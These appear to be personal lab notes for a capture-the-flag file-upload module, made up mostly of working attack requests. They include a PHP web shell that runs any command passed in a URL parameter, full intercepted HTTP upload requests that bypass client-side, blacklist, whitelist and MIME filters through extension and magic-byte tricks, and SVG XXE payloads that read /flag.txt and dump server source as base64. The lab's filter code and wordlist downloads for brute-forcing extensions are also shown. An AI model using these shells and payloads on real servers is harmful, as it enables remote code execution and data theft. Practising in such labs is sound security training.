File Upload


# Absent Validation
 

 echo "<?php echo gethostname(); ?>" > test.php

 upload the file and go to /uploads/test.php
 

# Upload Exploitation Web Shells

touch test2.php

nano test2.php

Copy:
```php

<?php system($_REQUEST['cmd']); ?>

```

upload the file and go to /uploads/test2.php?cmd=cat /flag.txt

# Client-Side Validation

- After poste a valid image to the upload 
- Intercept with burp and mofify the request like this:

```bash
POST /upload.php HTTP/1.1
Host: 94.237.60.251:50697
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31070384352095504274360374143
Content-Length: 110908
Origin: http://94.237.60.251:50697
Connection: close
Referer: http://94.237.60.251:50697/

-----------------------------31070384352095504274360374143
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------31070384352095504274360374143--


```

upload the file and go to /profile_images/shell.php?cmd=cat /flag.txt


# Blacklist Filters

```shell
 wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

```
- Intercept the request on burp and send to intruder to brute force the extensions .php
- Next modify the request like this, after discovery the correct extension

```bash

POST /upload.php HTTP/1.1
Host: 83.136.255.125:57766
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------100728475939235324011375106908
Content-Length: 262
Origin: http://83.136.255.125:57766
Connection: close
Referer: http://83.136.255.125:57766/

-----------------------------100728475939235324011375106908
Content-Disposition: form-data; name="uploadFile"; filename="shell.php8"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------100728475939235324011375106908--

```

upload the file and go to /profile_images/shell.php8?cmd=cat /flag.txt


# Blacklist Filters 

```shell
wget wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

```
- Intercpet the request and send to intruder, next perform a brute force to the extensions with is wordlist web-extensions.txt
- Next modify the request like this, after discovery the correct extension

```bash

POST /upload.php HTTP/1.1
Host: 94.237.60.75:45409
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------640482531457047109795953001
Content-Length: 255
Origin: http://94.237.60.75:45409
Connection: close
Referer: http://94.237.60.75:45409/

-----------------------------640482531457047109795953001
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------640482531457047109795953001--

```

upload the file and go to /profile_images/shell.phar?cmd=cat+/flag.txt

# Whitelist Filters

```shell
wget wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

```

- Intercpet the request and send to intruder, next perform a brute force to the extensions with is wordlist web-extensions.txt
- Next modify the request like this, after discovery the correct extension

```bash
POST /upload.php HTTP/1.1
Host: 94.237.50.149:40146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------349202245540057470341937322530
Content-Length: 266
Origin: http://94.237.50.149:40146
Connection: close
Referer: http://94.237.50.149:40146/

-----------------------------349202245540057470341937322530
Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml.gif"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------349202245540057470341937322530--


```

upload the file and go to /profile_images/shell.phtml.gif?cmd=cat+/flag.txt


# Type Filters

- The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image.

- Find what Content-Types are allowed

```bash
cp /usr/share/seclists/Miscellaneous/web/content-type.txt .
cat content-type.txt | grep 'image/' > image-content-types.txt

```

```python
POST /upload.php HTTP/1.1
Host: 94.237.50.149:40146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------349202245540057470341937322530
Content-Length: 266
Origin: http://94.237.50.149:40146
Connection: close
Referer: http://94.237.50.149:40146/

-----------------------------349202245540057470341937322530
Content-Disposition: form-data; name="uploadFile"; filename="shell.png.phtml"
Content-Type: image/png

GIF8
<?php system($_REQUEST['cmd']); ?>
-----------------------------349202245540057470341937322530--


```

# Limited File Uploads

```bash 
POST /upload.php HTTP/1.1
Host: 94.237.54.176:53230
Content-Length: 311
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywBHARWTTgBHEZKSr
Origin: http://94.237.54.176:53230
Referer: http://94.237.54.176:53230/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

------WebKitFormBoundarywBHARWTTgBHEZKSr
Content-Disposition: form-data; name="uploadFile"; filename="shell_xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>

------WebKitFormBoundarywBHARWTTgBHEZKSr--

```

Go to the main page and see the source code the page and the flag is there

Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) 

```bash
POST /upload.php HTTP/1.1
Host: 94.237.54.176:53230
Content-Length: 348
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLHINWHN4j85jgYG2
Origin: http://94.237.54.176:53230
Referer: http://94.237.54.176:53230/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

------WebKitFormBoundaryLHINWHN4j85jgYG2
Content-Disposition: form-data; name="uploadFile"; filename="shell_up.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

------WebKitFormBoundaryLHINWHN4j85jgYG2--
```

output is na source code in main page and is it:

PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=



# Skill Assement

Steps:
1.
2.


```bash

POST /contact/upload.php HTTP/1.1
Host: 94.237.49.212:32946
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.49.212:32946/contact/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 347

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFile"; filename="shell_up.svg.png"
Content-Type: image/png

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

------WebKitFormBoundary7MA4YWxkTrZu0gW--

```

```bash
// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

file.phar.png